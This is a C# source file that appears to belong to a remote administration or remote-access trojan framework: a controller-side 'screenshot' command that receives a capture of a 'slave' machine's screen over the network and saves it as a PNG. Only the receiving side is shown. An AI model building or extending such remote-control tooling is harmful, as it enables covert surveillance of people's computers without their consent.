using Master.AdvancedConsole;
using Master.Commands.Core;
using System;
using System.Collections.Generic;
using System.IO;

namespace Master.Commands
{
    internal class Screenshot : IMasterCommand
    {
        public string name { get; } = "screenshot";

        public string description { get; } = "Take a screenshot of the slave's screen and download it";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "",
            "?*:[filename.png]"
        };

        public void Process(List<string> args)
        {
            ColorTools.WriteCommandMessage("Waiting for screenshot data...");
            var fileName = args.Count == 1 ? args[0] :
                                             DateTime.Now.ToShortDateString().Replace('/', '-')
                                             + "_" + DateTime.Now.Hour
                                             + '-' + DateTime.Now.Minute
                                             + '-' + DateTime.Now.Second
                                             + ".png";

            try
            {
                using (var fs = new FileStream(fileName, FileMode.Create))
                {
                    MasterCommandsManager.networkManager.NetworkStreamToStream(fs);
                }

                ColorTools.WriteCommandSuccess($"Screenshot saved : {fileName}");
            }
            catch (Exception)
            {
                // Delete the partially created file
                File.Delete(fileName);
                ColorTools.WriteCommandError("An error occured");
            }
        }
    }
}
